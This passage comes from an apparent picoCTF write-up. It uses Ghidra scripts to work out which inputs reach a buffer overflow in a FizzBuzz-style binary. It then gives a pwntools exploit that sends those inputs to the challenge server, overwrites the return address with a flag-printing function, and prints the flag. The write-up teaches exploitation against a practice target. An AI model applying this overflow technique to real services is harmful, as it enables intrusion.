        <span class="token keyword">import</span> ghidra<span class="token punctuation">.</span>app<span class="token punctuation">.</span>decompiler<span class="token punctuation">.</span>parallel<span class="token punctuation">.</span>DecompilerCallback <span class="token keyword">as</span> DecompilerCallback

        cb <span class="token operator">=</span> self<span class="token punctuation">.</span>callback

        <span class="token keyword">class</span> <span class="token class-name">SignatureCallback</span><span class="token punctuation">(</span>DecompilerCallback<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">def</span> <span class="token function">process</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> decompileResults<span class="token punctuation">,</span> mon<span class="token punctuation">)</span><span class="token punctuation">:</span>
                <span class="token comment"># kick the call back to super if we are in the wrong</span>
                <span class="token comment"># process method (Python is typeless)</span>
                <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>decompileResults<span class="token punctuation">,</span> ghidra<span class="token punctuation">.</span>program<span class="token punctuation">.</span>model<span class="token punctuation">.</span>listing<span class="token punctuation">.</span>Function<span class="token punctuation">)</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token builtin">super</span><span class="token punctuation">(</span>SignatureCallback<span class="token punctuation">,</span> self<span class="token punctuation">)</span><span class="token punctuation">.</span>process<span class="token punctuation">(</span>decompileResults<span class="token punctuation">,</span> mon<span class="token punctuation">)</span>
                func <span class="token operator">=</span> decompileResults<span class="token punctuation">.</span>getDecompiledFunction<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">if</span> func <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                    <span class="token keyword">return</span> <span class="token string">&quot;// could not decompile &quot;</span> <span class="token operator">+</span> \
                           <span class="token builtin">str</span><span class="token punctuation">(</span>decompileResults<span class="token punctuation">.</span>getFunction<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">&quot;: &quot;</span> <span class="token operator">+</span> \
                           decompileResults<span class="token punctuation">.</span>getErrorMessage<span class="token punctuation">(</span><span class="token punctuation">)</span>
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    cb<span class="token punctuation">(</span>decompileResults<span class="token punctuation">)</span>
                    <span class="token keyword">return</span> <span class="token number">1</span>
        <span class="token keyword">class</span> <span class="token class-name">jc</span><span class="token punctuation">(</span>Consumer<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> fn<span class="token punctuation">)</span><span class="token punctuation">:</span>
                self<span class="token punctuation">.</span>accept <span class="token operator">=</span> fn
        callback <span class="token operator">=</span> SignatureCallback<span class="token punctuation">(</span>currentProgram<span class="token punctuation">,</span> <span class="token keyword">lambda</span> di<span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">)</span>
        ParallelDecompiler<span class="token punctuation">.</span>decompileFunctions<span class="token punctuation">(</span>callback<span class="token punctuation">,</span> currentProgram<span class="token punctuation">,</span> <span class="token builtin">iter</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>funcs<span class="token punctuation">)</span><span class="token punctuation">,</span> jc<span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
                                              ghidra<span class="token punctuation">.</span>util<span class="token punctuation">.</span>task<span class="token punctuation">.</span>TaskMonitor<span class="token punctuation">.</span>DUMMY<span class="token punctuation">)</span>
</code></pre></div><p>Basically, I wanted to input a list of <code>(function_start, target_address_to_reach)</code> to <code>Reach</code> and executing <code>run()</code> should give me a list of inputs to give (the values are the output of <code>Finding the path to this function</code>):</p> <div class="language-python extra-class"><pre class="language-python"><code>initial <span class="token operator">=</span> Reaches<span class="token punctuation">(</span>
    <span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">135578156</span><span class="token punctuation">,</span> <span class="token number">135579189</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135554703</span><span class="token punctuation">,</span> <span class="token number">135555335</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135562895</span><span class="token punctuation">,</span> <span class="token number">135563122</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135559058</span><span class="token punctuation">,</span> <span class="token number">135560068</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135552042</span><span class="token punctuation">,</span> <span class="token number">135553025</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135571043</span><span class="token punctuation">,</span> <span class="token number">135572323</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135422234</span><span class="token punctuation">,</span> <span class="token number">135422353</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135549359</span><span class="token punctuation">,</span> <span class="token number">135549964</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135536989</span><span class="token punctuation">,</span> <span class="token number">135537432</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135534658</span><span class="token punctuation">,</span> <span class="token number">135534858</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135539441</span><span class="token punctuation">,</span> <span class="token number">135539479</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135531566</span><span class="token punctuation">,</span> <span class="token number">135531685</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135528022</span><span class="token punctuation">,</span> <span class="token number">135530058</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135502753</span><span class="token punctuation">,</span> <span class="token number">135502953</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135525592</span><span class="token punctuation">,</span> <span class="token number">135527007</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135501723</span><span class="token punctuation">,</span> <span class="token number">135501869</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135520930</span><span class="token punctuation">,</span> <span class="token number">135522507</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135490370</span><span class="token punctuation">,</span> <span class="token number">135490759</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135498033</span><span class="token punctuation">,</span> <span class="token number">135500204</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135495570</span><span class="token punctuation">,</span> <span class="token number">135496040</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135515950</span><span class="token punctuation">,</span> <span class="token number">135517284</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135405945</span><span class="token punctuation">,</span> <span class="token number">135407603</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135400618</span><span class="token punctuation">,</span> <span class="token number">135401493</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135487181</span><span class="token punctuation">,</span> <span class="token number">135487273</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135483669</span><span class="token punctuation">,</span> <span class="token number">135484544</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135484883</span><span class="token punctuation">,</span> <span class="token number">135485569</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135432020</span><span class="token punctuation">,</span> <span class="token number">135434434</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135461885</span><span class="token punctuation">,</span> <span class="token number">135462274</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135478128</span><span class="token punctuation">,</span> <span class="token number">135479030</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135465431</span><span class="token punctuation">,</span> <span class="token number">135466522</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135506986</span><span class="token punctuation">,</span> <span class="token number">135507348</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135477526</span><span class="token punctuation">,</span> <span class="token number">135477969</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135471218</span><span class="token punctuation">,</span> <span class="token number">135471283</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135473194</span><span class="token punctuation">,</span> <span class="token number">135473286</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135470522</span><span class="token punctuation">,</span> <span class="token number">135470641</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135458227</span><span class="token punctuation">,</span> <span class="token number">135458994</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135445201</span><span class="token punctuation">,</span> <span class="token number">135447021</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135491876</span><span class="token punctuation">,</span> <span class="token number">135492770</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135501057</span><span class="token punctuation">,</span> <span class="token number">135501095</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135454588</span><span class="token punctuation">,</span> <span class="token number">135455355</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135451696</span><span class="token punctuation">,</span> <span class="token number">135452760</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135542564</span><span class="token punctuation">,</span> <span class="token number">135543466</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135390085</span><span class="token punctuation">,</span> <span class="token number">135390339</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135448310</span><span class="token punctuation">,</span> <span class="token number">135449104</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135557321</span><span class="token punctuation">,</span> <span class="token number">135558007</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135482262</span><span class="token punctuation">,</span> <span class="token number">135483299</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135434846</span><span class="token punctuation">,</span> <span class="token number">135434965</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135447400</span><span class="token punctuation">,</span> <span class="token number">135447465</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135411057</span><span class="token punctuation">,</span> <span class="token number">135411122</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135440308</span><span class="token punctuation">,</span> <span class="token number">135441399</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135475822</span><span class="token punctuation">,</span> <span class="token number">135475914</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135395395</span><span class="token punctuation">,</span> <span class="token number">135396000</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135402685</span><span class="token punctuation">,</span> <span class="token number">135403290</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135435448</span><span class="token punctuation">,</span> <span class="token number">135435783</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135429128</span><span class="token punctuation">,</span> <span class="token number">135429598</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135426962</span><span class="token punctuation">,</span> <span class="token number">135427351</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135533534</span><span class="token punctuation">,</span> <span class="token number">135534139</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135424697</span><span class="token punctuation">,</span> <span class="token number">135426058</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135419375</span><span class="token punctuation">,</span> <span class="token number">135419710</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135442606</span><span class="token punctuation">,</span> <span class="token number">135444237</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135416780</span><span class="token punctuation">,</span> <span class="token number">135418654</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135459257</span><span class="token punctuation">,</span> <span class="token number">135460537</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135393790</span><span class="token punctuation">,</span> <span class="token number">135394800</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135414218</span><span class="token punctuation">,</span> <span class="token number">135414958</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135409320</span><span class="token punctuation">,</span> <span class="token number">135409628</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135407880</span><span class="token punctuation">,</span> <span class="token number">135408971</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135399464</span><span class="token punctuation">,</span> <span class="token number">135399529</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135404851</span><span class="token punctuation">,</span> <span class="token number">135405753</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135411689</span><span class="token punctuation">,</span> <span class="token number">135413509</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135396275</span><span class="token punctuation">,</span> <span class="token number">135397609</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135387457</span><span class="token punctuation">,</span> <span class="token number">135388899</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135386547</span><span class="token punctuation">,</span> <span class="token number">135387098</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135391954</span><span class="token punctuation">,</span> <span class="token number">135392748</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135514672</span><span class="token punctuation">,</span> <span class="token number">135514926</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135544829</span><span class="token punctuation">,</span> <span class="token number">135544894</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">135467960</span><span class="token punctuation">,</span> <span class="token number">135468592</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
     <span class="token punctuation">(</span><span class="token number">135307016</span><span class="token punctuation">,</span> <span class="token number">135307162</span><span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">,</span> check<span class="token punctuation">)</span>

initial_results <span class="token operator">=</span> initial<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><p>But <code>initial_results</code> also ends up having <code>ExitFast</code> in it, so lets run <code>Reach</code> on all the <code>ExitFasts</code>:</p> <div class="language-python extra-class"><pre class="language-python"><code>exits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">(</span>inp<span class="token punctuation">.</span>fn<span class="token punctuation">,</span> getFunctionAt<span class="token punctuation">(</span>toAddr<span class="token punctuation">(</span>inp<span class="token punctuation">.</span>fn<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>body<span class="token punctuation">.</span>maxAddress<span class="token punctuation">.</span>offset<span class="token punctuation">)</span>     <span class="token comment"># (first address, last address)</span>
         <span class="token keyword">for</span> func <span class="token keyword">in</span> initial<span class="token punctuation">.</span>mapping<span class="token punctuation">.</span>keys<span class="token punctuation">(</span><span class="token punctuation">)</span>
         <span class="token keyword">for</span> inp <span class="token keyword">in</span> initial_results<span class="token punctuation">[</span>func<span class="token punctuation">]</span>
         <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>inp<span class="token punctuation">,</span> ExitFast<span class="token punctuation">)</span><span class="token punctuation">]</span>

exiter <span class="token operator">=</span> Reaches<span class="token punctuation">(</span>exits<span class="token punctuation">,</span> check<span class="token punctuation">)</span>
exiter_results <span class="token operator">=</span> exiter<span class="token punctuation">.</span>run<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><p>The above code assumes the last address of the function is the exit block (which is the block with the <code>ret</code> instruction), which for our simplistic binary is true. Other cases should involve iterating over the block graph and finding terminating nodes.</p> <p>Now we have to replace the <code>ExitFast</code> with the equivalent list of inputs.</p> <div class="language-python extra-class"><pre class="language-python"><code>finale <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">for</span> func<span class="token punctuation">,</span> _ <span class="token keyword">in</span> initial<span class="token punctuation">.</span>reaches<span class="token punctuation">:</span>
    inps <span class="token operator">=</span> initial_results<span class="token punctuation">[</span>func<span class="token punctuation">]</span>
    idx <span class="token operator">=</span> <span class="token number">0</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> idx <span class="token operator">&gt;=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>inps<span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">break</span>
        <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>inps<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">,</span> ExitFast<span class="token punctuation">)</span><span class="token punctuation">:</span>
            replace <span class="token operator">=</span> exiter_results<span class="token punctuation">[</span>inps<span class="token punctuation">[</span>idx<span class="token punctuation">]</span><span class="token punctuation">.</span>fn<span class="token punctuation">]</span>
            inps <span class="token operator">=</span> inps<span class="token punctuation">[</span><span class="token punctuation">:</span>idx<span class="token punctuation">]</span> <span class="token operator">+</span> replace <span class="token operator">+</span> inps<span class="token punctuation">[</span><span class="token punctuation">(</span>idx <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
            idx <span class="token operator">+=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>replace<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span>
        idx <span class="token operator">+=</span> <span class="token number">1</span>
    finale <span class="token operator">+=</span> <span class="token punctuation">[</span><span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span> inps<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">]</span>

<span class="token keyword">print</span><span class="token punctuation">(</span>finale<span class="token punctuation">)</span>
</code></pre></div><p>We convert the input list into a string then add it to the <code>finale</code> array. The output is like so:</p> <div class="language- extra-class"><pre class="language-text"><code>... &quot;FizzBuzz(16, ['Equals(16)'])&quot;, &quot;FizzBuzz(14, ['NotEquals(14)'])&quot;, &quot;FizzBuzz(10, ['Equals(10)'])&quot;, &quot;FizzBuzz(13, ['NotEquals(13)'])&quot;], [&quot;FizzBuzz(17, ['NotEquals(17)'])&quot;,
&quot;FizzBuzz(2, ['Equals(2)'])&quot;, &quot;FizzBuzz(5, ['NotEquals(5)'])&quot;], [&quot;FizzBuzz(6, ['NotEquals(6)'])&quot;, &quot;FizzBuzz(3, ['Equals(3)'])&quot;, &quot;FizzBuzz(15, ['NotEquals(15)'])&quot;, &quot;FizzBuzz(17, ['Equals(17)'])&quot;, &quot;FizzBuzz(18, ['NotEquals(18)'])&quot;, &quot;FizzBuzz(13, ['Equals(13)'])&quot;, &quot;FizzBuzz(18, ['NotEquals(18)'])&quot;, &quot;FizzBuzz(5, ['Equals(5)'])&quot;,
&quot;FizzBuzz(11, ['NotEquals(11)'])&quot;, &quot;FizzBuzz(7, ['Equals(7)'])&quot;, &quot;FizzBuzz(13, ['NotEquals(13)'])&quot;, &quot;FizzBuzz(3, ['Equals(3)'])&quot;, &quot;FizzBuzz(9, ['NotEquals(9)'])&quot;, &quot;FizzBuzz(7, ['Equals(7)'])&quot;, &quot;FizzBuzz(18, ['NotEquals(18)'])&quot;, &quot;FizzBuzz(7, ['Equals(7)'])&quot;, &quot;FizzBuzz(6, ['NotEquals(6)'])&quot;, &quot;FizzBuzz(6, ['Equals(6)'])&quot;, &quot;FizzBuzz(2, ['NotEquals(2)'])&quot;, &quot;FizzBuzz(4, ['Equals(4)'])&quot;, &quot;FizzBuzz(8, ['NotEquals(8)'])&quot;, &quot;FizzBuzz(12, ['Equals(12)'])&quot;, &quot;FizzBuzz(6, ['NotEquals(6)'])&quot;, &quot;FizzBuzz(13, ['Equals(13)'])&quot;, &quot;FizzBuzz(4, ['NotEquals(4)'])&quot;, &quot;FizzBuzz(5, ['Equals(5)'])&quot;, &quot;FizzBuzz(18, ['NotEquals(18)'])&quot;, &quot;FizzBuzz(7, ['Equals(7)'])&quot;, &quot;FizzBuzz(4, ['NotEquals(4)'])&quot;, &quot;FizzBuzz(13, ['Equals(13)'])&quot;, &quot;FizzBuzz(12, ['NotEquals(12)'])&quot;, &quot;FizzBuzz(2, ['Equals(2)'])&quot;, &quot;FizzBuzz(17, ['NotEquals(17)'])&quot;, &quot;FizzBuzz(12, ['Equals(12)'])&quot;, &quot;FizzBuzz(15, ['NotEquals(15)'])&quot;, &quot;FizzBuzz(11, ['Equals(11)'])&quot;, &quot;FizzBuzz(16, ['NotEquals(16)'])&quot;, &quot;FizzBuzz(9, ['Equals(9)'])&quot;, &quot;FizzBuzz(4, ['NotEquals(4)'])&quot;, &quot;FizzBuzz(14, ['Equals(14)'])&quot;, &quot;FizzBuzz(7, ['NotEquals(7)'])&quot;, &quot;FizzBuzz(4, ['Equals(4)'])&quot;, &quot;FizzBuzz(7, ['NotEquals(7)'])&quot;, &quot;FizzBuzz(5, ['Equals(5)'])&quot;, &quot;FizzBuzz(2, ['NotEquals(2)'])&quot;],
[&quot;FizzBuzz(46, ['NotEquals(1)', 'NotEquals(2)', 'NotEquals(3)', 'NotEquals(4)', 'Equals(5)'])&quot;]]
buzz_fizz_trace.py&gt; Finished!
</code></pre></div><p>The output is an 2-dimensional array of <code>FizzBuzz(n, ['Equals(y)', 'NotEquals(x)' ...])</code> (note that the conditions are a list of strings).
I also saved it to a file so that it can be read later.</p> <h2 id="writing-the-exploit"><a href="#writing-the-exploit" class="header-anchor">#</a> Writing the exploit</h2> <p>Now that we know what input to provide to get our buffer overflow, we need to know what to do once we get control. Specifically, there is a function (<code>0x8048656</code>)
that will print out the flag. I iterated over the 2-dimensional array to get the <code>FizzBuzz</code> and its list of conditions, then wrote functions that provide the appropriate input.</p> <p>These functions are called using <code>eval</code> (for simplicity). The functions are: <code>FizzBuzz</code>, <code>Equals</code>, <code>NotEquals</code>.</p> <div class="language-python extra-class"><pre class="language-python"><code><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>

win <span class="token operator">=</span> <span class="token number">0x8048656</span>
c <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">&quot;mercury.picoctf.net:28132&quot;</span><span class="token punctuation">)</span>
ops <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>

<span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">&quot;./ops.txt&quot;</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span> <span class="token comment"># this is the file where I saved the output</span>
    ops <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">NotEquals</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x <span class="token operator">!=</span> n
<span class="token keyword">def</span> <span class="token function">Equals</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x <span class="token operator">==</span> n

<span class="token comment"># get the appropriate input to provide,</span>
<span class="token comment"># based on Equals and NotEquals conditions</span>
<span class="token keyword">def</span> <span class="token function">get</span><span class="token punctuation">(</span>eqs<span class="token punctuation">)</span><span class="token punctuation">:</span>
    eqs <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span>eqs<span class="token punctuation">)</span>
    <span class="token comment"># lame method of finding a number that fits</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> <span class="token builtin">all</span><span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token keyword">lambda</span> x<span class="token punctuation">:</span> x<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">,</span> eqs<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> i

<span class="token keyword">def</span> <span class="token function">FizzBuzz</span><span class="token punctuation">(</span>a<span class="token punctuation">,</span> l<span class="token punctuation">)</span><span class="token punctuation">:</span>
    eqs <span class="token operator">=</span> <span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">,</span> l<span class="token punctuation">)</span>
    n <span class="token operator">=</span> get<span class="token punctuation">(</span>eqs<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> i <span class="token operator">%</span> <span class="token number">15</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;fizzbuzz&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> i <span class="token operator">%</span> <span class="token number">5</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;buzz&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> i <span class="token operator">%</span> <span class="token number">3</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;fizz&quot;</span><span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> n <span class="token operator">!=</span> a<span class="token punctuation">:</span>
        c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">&quot;NANI&quot;</span><span class="token punctuation">)</span> <span class="token comment"># exiting early</span>

t <span class="token operator">=</span> <span class="token builtin">len</span><span class="token punctuation">(</span>ops<span class="token punctuation">)</span>
<span class="token keyword">for</span> op1 <span class="token keyword">in</span> ops<span class="token punctuation">:</span>
    <span class="token keyword">for</span> op <span class="token keyword">in</span> op1<span class="token punctuation">:</span>
        <span class="token builtin">eval</span><span class="token punctuation">(</span>op<span class="token punctuation">)</span>

c<span class="token punctuation">.</span>send<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#          padding        saved rbp         win</span>
c<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>cyclic<span class="token punctuation">(</span><span class="token number">0x63</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span><span class="token number">0xfffffff0</span><span class="token punctuation">)</span> <span class="token operator">+</span> p32<span class="token punctuation">(</span>win<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># buffer overflow</span>

c<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
</code></pre></div><p>Flag is <code>picoCTF{y0u_found_m3}</code></p></div> <footer class="page-edit"><!----> <!----></footer> <!----> <!----></main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.c3d8ca62.js" defer></script><script src="/assets/js/6.3722ae10.js" defer></script><script src="/assets/js/3.8eed2eee.js" defer></script><script src="/assets/js/11.fb3a3275.js" defer></script>
  </body>
